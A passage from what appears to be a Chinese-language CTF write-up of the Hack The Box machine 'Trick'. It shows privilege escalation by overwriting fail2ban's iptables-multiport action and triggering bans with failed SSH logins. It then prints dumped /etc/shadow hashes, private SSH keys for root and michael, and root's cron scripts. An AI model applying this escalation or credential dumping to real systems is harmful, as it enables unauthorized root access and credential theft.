+<p>这里还会被定时清理，不过重新进一下目录就恢复了</p>
+<p><img alt="image-20241130161329944.png" loading="lazy" decoding="async" width="1123" height="538" src="/_astro/image-20241130161329944.4HeoBgt__ncOPV.webp" srcset=""></p>
+<p>这里可以修改 actionban 的命令，因为方便触发（多次登录密码错误）</p>
+<p><img alt="image-20241130164557005.png" loading="lazy" decoding="async" width="1096" height="361" src="/_astro/image-20241130164557005.CokwTYer_GRc2G.webp" srcset=""></p>
+<p>但是没有成功，看一下 fail2ban 的配置文件 <code>/etc/fail2ban/jail.conf</code></p>
+<p><img alt="image-20241130163946282.png" loading="lazy" decoding="async" width="835" height="190" src="/_astro/image-20241130163946282.BLP2eMzv_1AbhzP.webp" srcset=""></p>
+<p><img alt="image-20241130164053681.png" loading="lazy" decoding="async" width="871" height="120" src="/_astro/image-20241130164053681.BudZRWki_12YyAx.webp" srcset=""></p>
+<p>发现前面的 iptable 规则加载的是 iptables-multiport，并且需要登陆失败 5 次才会被禁用</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>cat iptables-multiport.conf | tail -n 12 | head -n 1</span></span>
+<span class="line"><span>rm /etc/fail2ban/action.d/iptables-multiport.conf</span></span>
+<span class="line"><span>cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf</span></span>
+<span class="line"><span>sudo /etc/init.d/fail2ban restart</span></span></code></pre>
+<p>然后 ssh 登录错误 5 次触发封禁策略，查看 <code>/bin/bash</code> 权限</p>
+<p><img alt="image-20241130165402260.png" loading="lazy" decoding="async" width="1519" height="958" src="/_astro/image-20241130165402260.CCMkxptC_2qAjzX.webp" srcset=""></p>
+<p><img alt="image-20241130165443899.png" loading="lazy" decoding="async" width="1036" height="870" src="/_astro/image-20241130165443899.CrWRtWgA_Z1JoJT6.webp" srcset=""></p>
+<h2 id="more">More</h2>
+<h3 id="dump-hash">Dump Hash</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root:$6$lbBzS2rUUVRa6Erd$u2u317eVZBZgdCrT2HViYv.69vxazyKjAuVETHTpTpD42H0RDPQIbsCHwPdKqBQphI/FOmpEt3lgD9QBsu6nU1:19104:0:99999:7:::</span></span>
+<span class="line"><span>daemon:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>bin:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>sys:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>sync:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>games:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>man:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>lp:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>mail:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>news:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>uucp:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>proxy:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>www-data:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>backup:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>list:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>irc:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>gnats:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>nobody:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>_apt:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>systemd-timesync:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>systemd-network:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>systemd-resolve:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>messagebus:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>tss:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>dnsmasq:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>usbmux:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>rtkit:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>pulse:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>speech-dispatcher:!:18800:0:99999:7:::</span></span>
+<span class="line"><span>avahi:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>saned:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>colord:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>geoclue:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>hplip:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>Debian-gdm:*:18800:0:99999:7:::</span></span>
+<span class="line"><span>systemd-coredump:!!:18800::::::</span></span>
+<span class="line"><span>mysql:!:19104:0:99999:7:::</span></span>
+<span class="line"><span>sshd:*:19104:0:99999:7:::</span></span>
+<span class="line"><span>postfix:*:19104:0:99999:7:::</span></span>
+<span class="line"><span>bind:*:19104:0:99999:7:::</span></span>
+<span class="line"><span>michael:$6$SPev7eFL5z0aKFf0$5iLTl9egsGGePEPUnNJlFyw8HHvTwqVC3/THKzW2YD5ZPnbkN7pSOeOkXe9uiUHfOJegJdYT0j3Z9pz.FSX2y0:19104:0:99999:7:::</span></span></code></pre>
+<h3 id="ssh-key">SSH Key</h3>
+<ul>
+<li>Key for Michael</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>-----BEGIN OPENSSH PRIVATE KEY-----</span></span>
+<span class="line"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span></span>
+<span class="line"><span>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz</span></span>
+<span class="line"><span>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G</span></span>
+<span class="line"><span>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+</span></span>
+<span class="line"><span>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/</span></span>
+<span class="line"><span>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4</span></span>
+<span class="line"><span>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC</span></span>
+<span class="line"><span>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0</span></span>
+<span class="line"><span>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE</span></span>
+<span class="line"><span>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L</span></span>
+<span class="line"><span>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6</span></span>
+<span class="line"><span>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C</span></span>
+<span class="line"><span>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/</span></span>
+<span class="line"><span>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC</span></span>
+<span class="line"><span>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge</span></span>
+<span class="line"><span>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0</span></span>
+<span class="line"><span>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V</span></span>
+<span class="line"><span>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS</span></span>
+<span class="line"><span>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA</span></span>
+<span class="line"><span>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT</span></span>
+<span class="line"><span>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn</span></span>
+<span class="line"><span>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP</span></span>
+<span class="line"><span>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN</span></span>
+<span class="line"><span>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+</span></span>
+<span class="line"><span>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==</span></span>
+<span class="line"><span>-----END OPENSSH PRIVATE KEY-----</span></span></code></pre>
+<ul>
+<li>Key for Root</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>-----BEGIN OPENSSH PRIVATE KEY-----</span></span>
+<span class="line"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span></span>
+<span class="line"><span>NhAAAAAwEAAQAAAQEAoSBXc6x1gauygp8zl8Y13QXTwj633MsMv/0YsBzmGiHb1xBadkGC</span></span>
+<span class="line"><span>6a0abDxM4UycoYN82sT7N732cJqL9mWK7ZeGPQX4+RHD0fQnVQY3KCYak7RxQQtilsErhG</span></span>
+<span class="line"><span>VgovwAtnbaKA+tlfsO7IlD3Mv6lbJ/ElD9drwhJOVdEf4IL+8SstVgd0AehVQgnLXd58MK</span></span>
+<span class="line"><span>7tuKX+a/+eBBjzfpA6hWIzTT3koLnMoTWe5uCuhIJiaBUQyvrBQ1C/M4E7rnHw6Rgh9x9d</span></span>
+<span class="line"><span>1LPInu0NMxbw0LAuFaQRcz3ewzEt8M2d639vedwahK5MyuTQS/ZTt33yjoas40kv+NZ5Y0</span></span>
+<span class="line"><span>5vVeP6XxcwAAA8jXOo441zqOOAAAAAdzc2gtcnNhAAABAQChIFdzrHWBq7KCnzOXxjXdBd</span></span>
+<span class="line"><span>PCPrfcywy//RiwHOYaIdvXEFp2QYLprRpsPEzhTJyhg3zaxPs3vfZwmov2ZYrtl4Y9Bfj5</span></span>
+<span class="line"><span>EcPR9CdVBjcoJhqTtHFBC2KWwSuEZWCi/AC2dtooD62V+w7siUPcy/qVsn8SUP12vCEk5V</span></span>
+<span class="line"><span>0R/ggv7xKy1WB3QB6FVCCctd3nwwru24pf5r/54EGPN+kDqFYjNNPeSgucyhNZ7m4K6Egm</span></span>
+<span class="line"><span>JoFRDK+sFDUL8zgTuucfDpGCH3H13Us8ie7Q0zFvDQsC4VpBFzPd7DMS3wzZ3rf2953BqE</span></span>
+<span class="line"><span>rkzK5NBL9lO3ffKOhqzjSS/41nljTm9V4/pfFzAAAAAwEAAQAAAQEAkxF9ITUZ8GjywC1m</span></span>
+<span class="line"><span>HzOpOHu4JIWwtxSTJ65x2VYXZWTgT7Y6i9QSFQ6OnpqPpdmS4g2tadYAY4m9plw6QoW+wE</span></span>
+<span class="line"><span>zdF1gbP+RKM5pCSGYq9DeLbKR392HX9DiPawJJqZqRX/qt94EP9WS544cK7T82E2tgdyx7</span></span>
+<span class="line"><span>nePr8Mx2HhUcDfsbxQlRbM9oKqIBQ0v9GdBotvi+Ri/IQfpEpmS64cU450/DlrwQ358MU9</span></span>
+<span class="line"><span>i8so0KlnAHLYxgzhEzPjPehaRShcsRdhasw1/xVKk7PoBvXzz9r+Ywo5b2htiYzqxt5N5i</span></span>
+<span class="line"><span>E8UOrUeYb7G21QjuhKB9KerukyGeHdBPjqvYuYjTwf2dUQAAAIEAnSUxZdekVLY0IoYPBF</span></span>
+<span class="line"><span>DBDIMkk97Kq2v8H51L9Q0rKBs79x4ZaV56LfMnTxuAxwnUMUauyPeGZFDgVsFwg0JK+vbR</span></span>
+<span class="line"><span>Kj9idBoMTOuDdfTE4IJtT3tEKClzFS9YSrYdQ78OUu8Kip3p5OuWfrzTuhRCKZ2cwd86WU</span></span>
+<span class="line"><span>ghEBWtHhn/2RsAAACBANHocGFZWWM1DGtA3ZXiytuJLh7D55NUPk7jumm+qcF7UUiKaRHA</span></span>
+<span class="line"><span>QnQ44oxHssJbkGi4S3tvfSlXFtNboQCt3q5Wgc3wl4S+sBGoq1xsZuXAz/3QX2AjXSpN/S</span></span>
+<span class="line"><span>PkO+h4pk25aAFjGmAMMoH1Ty9v2X8ahYRY5EV8Y/LRcMF32Z5rAAAAgQDEgb1hc85TS0Wz</span></span>
+<span class="line"><span>pmGTto+ok3eI/10wxgbZXtdki7Jn1npNI5S7lh0r76jqEn5edcIYlwcUV+b6dCucDUhUHl</span></span>
+<span class="line"><span>7VT/uoy+BKbanLzM809KCnuLCM7LDISk4N/S79xiuFlrk11MrV2qaxZANiYEkOd1jKRGPi</span></span>
+<span class="line"><span>UDRYRn2lPX7WiLyrGQAAAApyb290QHRyaWNrAQIDBAUGBw==</span></span></code></pre>
+<h3 id="root-用户计划任务">Root 用户计划任务</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root@trick:~# crontab -l</span></span>
+<span class="line"><span>SHELL=/bin/bash</span></span>
+<span class="line"><span>*/2 * * * * rm -rf /var/mail/*</span></span>
+<span class="line"><span>*/3 * * * * /bin/bash /root/f2b.sh</span></span>
+<span class="line"><span>@reboot sleep 15 &amp;&amp; /bin/bash /root/set_dns.sh</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root@trick:~# ls</span></span>
+<span class="line"><span>f2b.sh  fail2ban  root.txt  set_dns.sh</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root@trick:~# cat f2b.sh</span></span>
+<span class="line"><span>#!/bin/bash</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>rm -rf /etc/fail2ban/*</span></span>
+<span class="line"><span>cp -r /root/fail2ban /etc/</span></span>
+<span class="line"><span>chown root:security /etc/fail2ban/action.d</span></span>
+<span class="line"><span>chmod 770 /etc/fail2ban/action.d</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>root@trick:~# cat set_dns.sh</span></span>
+<span class="line"><span>#!/bin/bash</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>ip=$(hostname -I)</span></span>
+<span class="line"><span>last=$(echo $ip | cut -d "." -f 4 | awk '{print $1;}')</span></span>
+<span class="line"><span>first=$(echo $ip | cut -d "." -f 1)</span></span>
+<span class="line"><span>second=$(echo $ip | cut -d "." -f 2)</span></span>
+<span class="line"><span>third=$(echo $ip | cut -d "." -f 3)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo ';</span></span>
+<span class="line"><span>; BIND reverse data file for local loopback interface</span></span>
+<span class="line"><span>;</span></span>
+<span class="line"><span>$TTL    604800</span></span>
+<span class="line"><span>@    IN    SOA    trick.htb. root.trick.htb (</span></span>
+<span class="line"><span>                  3        ; Serial</span></span>
+<span class="line"><span>             604800        ; Refresh</span></span>
+<span class="line"><span>              86400        ; Retry</span></span>
+<span class="line"><span>            2419200        ; Expire</span></span>
+<span class="line"><span>             604800 )    ; Negative Cache TTL</span></span>
+<span class="line"><span>;</span></span>
+<span class="line"><span>@    IN    NS    trick.htb.</span></span>
+<span class="line"><span>'$last'    IN    PTR    trick.htb.' &gt; /etc/bind/reverse.trick.htb</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo ';</span></span>
+<span class="line"><span>; BIND data file for local loopback interface</span></span>
+<span class="line"><span>;</span></span>
+<span class="line"><span>$TTL    604800</span></span>
+<span class="line"><span>@    IN    SOA    trick.htb. root.trick.htb. (</span></span>
+<span class="line"><span>                  5        ; Serial</span></span>
+<span class="line"><span>             604800        ; Refresh</span></span>
+<span class="line"><span>              86400        ; Retry</span></span>
+<span class="line"><span>            2419200        ; Expire</span></span>
+<span class="line"><span>             604800 )    ; Negative Cache TTL</span></span>
+<span class="line"><span>;</span></span>
+<span class="line"><span>@    IN    NS    trick.htb.</span></span>
+<span class="line"><span>@    IN    A    127.0.0.1</span></span>
+<span class="line"><span>@    IN    AAAA    ::1</span></span>
+<span class="line"><span>preprod-payroll    IN    CNAME    trick.htb.' &gt; /etc/bind/db.trick.htb</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo 'zone "trick.htb" {</span></span>
+<span class="line"><span>    type master;</span></span>
+<span class="line"><span>    file "/etc/bind/db.trick.htb";</span></span>
+<span class="line"><span>    allow-transfer { any; };</span></span>
+<span class="line"><span>};</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>zone "'$third'.'$second'.'$first'.in-addr.arpa" {</span></span>
+<span class="line"><span>    type master;</span></span>
+<span class="line"><span>    file "/etc/bind/reverse.trick.htb";</span></span>
+<span class="line"><span>};' &gt; /etc/bind/named.conf.local</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>systemctl restart bind9</span></span></code></pre>
+</div></div><aside class="toc" data-toc hidden aria-label="目录" data-astro-cid-sgg5joot><p class="toc-label" data-astro-cid-sgg5joot>目录</p><nav class="toc-nav" data-toc-nav data-astro-cid-sgg5joot></nav></aside></div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer><script type="module">function e(e){return e.trim().toLowerCase().replace(/\s+/g,`-`).replace(/[^\w\u4e00-\u9fff-]+/g,``).replace(/-+/g,`-`).replace(/^-|-$/g,``)||`section`}var t=null;function n(){let n=document.querySelector(`[data-article-content]`),r=document.querySelector(`[data-toc]`),i=document.querySelector(`[data-toc-nav]`);if(!n||!r||!i)return;t?.disconnect(),t=null,i.replaceChildren();let a=Array.from(n.querySelectorAll(`h2, h3`)).filter(e=>(e.textContent??``).trim().length>0);if(a.length===0){r.hidden=!0;return}r.hidden=!1;let o=new Set,s=[];for(let t of a){let n=t.id;if(!n){let r=e(t.textContent??``);n=r;let i=2;for(;o.has(n)||document.getElementById(n);)n=`${r}-${i}`,i+=1;t.id=n}o.add(n);let r=document.createElement(`a`);r.href=`#${n}`,r.textContent=(t.textContent??``).trim(),r.className=t.tagName===`H3`?`toc-h3`:`toc-h2`,r.dataset.target=n,i.appendChild(r),s.push(r)}let c=e=>{for(let t of s)t.classList.toggle(`active`,t.dataset.target===e)};t=new IntersectionObserver(e=>{let t=e.filter(e=>e.isIntersecting).sort((e,t)=>e.target.offsetTop-t.target.offsetTop);t[0]&&c(t[0].target.id)},{rootMargin:`-15% 0px -70% 0px`,threshold:[0,1]});for(let e of a)t.observe(e);location.hash?c(decodeURIComponent(location.hash.slice(1))):a[0]&&c(a[0].id)}n(),document.addEventListener(`article-content-unlocked`,()=>{n()});</script></body></html>
